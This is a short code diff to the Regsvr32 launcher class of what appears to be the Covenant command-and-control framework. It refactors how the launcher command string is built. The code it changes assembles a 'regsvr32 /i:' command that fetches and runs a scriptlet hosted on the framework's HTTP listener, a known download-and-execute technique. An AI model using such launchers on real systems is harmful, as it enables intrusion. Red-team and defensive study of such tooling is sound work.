@@ -6,6 +6,7 @@ using System;
 using System.Linq;
 using Microsoft.CodeAnalysis;
 
+using Covenant.Core;
 using Covenant.Models.Listeners;
 
 namespace Covenant.Models.Launchers
@@ -24,11 +25,12 @@ namespace Covenant.Models.Launchers
             this.CompressStager = false;
         }
 
+        public override string GetFilename() => Utilities.GetSanitizedFilename(this.Name) + ".sct";
+
         protected override string GetLauncher()
         {
-            string launcher = "regsvr32 " + this.ParameterString + " /i:file.sct " + this.DllName;
+            string launcher = $"regsvr32 {this.ParameterString} /i:{this.GetFilename()} {this.DllName}";
             this.LauncherString = launcher;
-
             return this.LauncherString;
         }
 
@@ -38,7 +40,7 @@ namespace Covenant.Models.Launchers
             if (httpListener != null)
             {
 				Uri hostedLocation = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
-                string launcher = "regsvr32 " + this.ParameterString + " /i:" + hostedLocation + " " + this.DllName;
+                string launcher = $"regsvr32 {this.ParameterString} /i:{hostedLocation} {this.DllName}";
                 this.LauncherString = launcher;
                 return launcher;
             }
